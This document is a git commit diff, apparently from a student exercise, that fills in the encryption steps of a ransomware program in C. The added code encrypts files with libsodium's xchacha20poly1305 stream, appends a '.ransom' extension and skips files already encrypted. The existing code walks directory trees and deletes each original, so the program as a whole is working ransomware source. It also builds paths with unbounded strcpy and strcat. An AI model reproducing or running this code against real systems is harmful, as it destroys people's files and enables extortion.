9749a8970a68ca8595ccfe2397c683548ee9c323
Aurelien <aurelien.duval@epitech.eu>
2025-11-13 18:57:59 +0100

    [ADD] step 1 and 2

--- sources/encryption.c
+++ sources/encryption.c
@@ -4,34 +4,65 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-/*
-** Here, you have to open both files with different permissions : think of what you want to
-** to do with each file. Don't forget to check the return values of your syscalls !
-*/
 bool init_encryption(FILE **to_encrypt, FILE **encrypted,
     const char *filepath, const char *optfilepath)
 {
-    // step 2
+    *to_encrypt = fopen(filepath, "rb");
+    if (!*to_encrypt)
+        return false;
+
+    *encrypted = fopen(optfilepath, "wb");
+    if (!*encrypted) {
+        fclose(*to_encrypt);
+        return false;
+    }
+
+    return true;
 }
 
-/*
-** I strongly advise to code near the sources/decryption.c code : it is the opposite process.
-** Here, you have to initialize the header, then write it in the encrypted file.
-*/
 int write_header(unsigned char *generated_key, FILE **to_encrypt,
     FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
 {
-    // step 2
+    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
+
+    if (crypto_secretstream_xchacha20poly1305_init_push(
+            st, header, generated_key) != 0)
+        return -1;
+
+    if (fwrite(header, 1, sizeof header, *encrypted)
+        != sizeof header)
+        return -1;
+
+    return 0;
 }
 
-/*
-** The encryption loop really looks the same than the decryption one.
-** In decryption_loop, the crypto_secretstream_xchacha20poly1305_pull is used to retrieve data.
-** Think of the opposite of "pull" things... The link provided in the README.md about libsodium
-** should really help you.
-*/
 int encryption_loop(FILE *to_encrypt, FILE *encrypted,
     crypto_secretstream_xchacha20poly1305_state st)
 {
-    // step 2
+    unsigned char buf_in[CHUNK_SIZE];
+    unsigned char buf_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
+    size_t rlen;
+    int eof = 0;
+
+    while (!eof) {
+        rlen = fread(buf_in, 1, sizeof buf_in, to_encrypt);
+
+        if (rlen < sizeof buf_in) {
+            if (feof(to_encrypt))
+                eof = 1;
+            else
+                return -1;
+        }
+
+        unsigned char tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
+
+        if (crypto_secretstream_xchacha20poly1305_push(
+                &st, buf_out, NULL, buf_in, rlen, NULL, 0, tag) != 0)
+            return -1;
+
+        if (fwrite(buf_out, 1, rlen + crypto_secretstream_xchacha20poly1305_ABYTES, encrypted)
+            != rlen + crypto_secretstream_xchacha20poly1305_ABYTES)
+            return -1;
+    }
+    return 0;
 }
--- sources/ransom.c
+++ sources/ransom.c
@@ -5,10 +5,6 @@
 #define LEN_RANSOM_EXTENSION (strlen(".ransom"))
 #define LEN_DECRYPTED_EXTENSION (strlen(".decrypted"))
 
-/*
-** Here, we are going recursively though directories and sub directory
-** to encrypt or decrypt (depending on the cryptalgo_t choosen) all the files with in it.
-*/
 int iter_recursively_through_files(char *path, char *password,
     cryptalgo_t algo)
 {
@@ -27,15 +23,18 @@ int iter_recursively_through_files(char *path, char *password,
         switch (dir_entry->d_type) {
             case 4:
                 get_new_path_name(path, new_path, dir_entry->d_name);
-                iter_recursively_through_files(new_path, password, algo); break;
+                iter_recursively_through_files(new_path, password, algo);
+                break;
             case 8:
                 get_new_path_name(path, new_path, dir_entry->d_name);
                 algo.format_filename(new_path, opt_filename);
                 core(password, new_path, opt_filename, algo);
-                remove(new_path); break;
+                remove(new_path);
+                break;
 #ifdef _DIRENT_HAVE_D_TYPE
             case DT_UNKNOWN:
-                dprintf(STDERR_FILENO, "Data Type Unknown\n"); break;
+                dprintf(STDERR_FILENO, "Data Type Unknown\n");
+                break;
 #endif
         }
     }
@@ -45,22 +44,29 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    strcpy(finalpath, parentpath);
+    strcat(finalpath, "/");
+    strcat(finalpath, currentpath);
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
+    strcpy(opt_filename, filename);
+    strcat(opt_filename, ".ransom");
 }
 
-
-/*
-** As you can compare with the skip_already_decrypted for the decryption algorithm,
-** you just have to skip the basics path and all the files with the encryptes extension.
-*/
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+    int len = strlen(path);
+
+    if (skip_basics_path(path))
+        return true;
+
+    if (len >= LEN_RANSOM_EXTENSION &&
+        !strcmp(&path[len - LEN_RANSOM_EXTENSION], ".ransom"))
+        return true;
+
+    return false;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
@@ -75,8 +81,7 @@ void remove_file_extension(const char *filename, char *opt_filename)
 
 bool skip_basics_path(const char *path)
 {
-    if (strcmp(path, ".")
-            && strcmp(path, ".."))
+    if (strcmp(path, ".") && strcmp(path, ".."))
         return false;
     return true;
 }
@@ -86,8 +91,8 @@ bool skip_already_decrypted(const char *path)
     int len = strlen(path);
 
     if (skip_basics_path(path) ||
-            !strcmp(&path[len - LEN_DECRYPTED_EXTENSION], ".decrypted"))
+        !strcmp(&path[len - LEN_DECRYPTED_EXTENSION], ".decrypted"))
         return true;
+
     return false;
 }
-
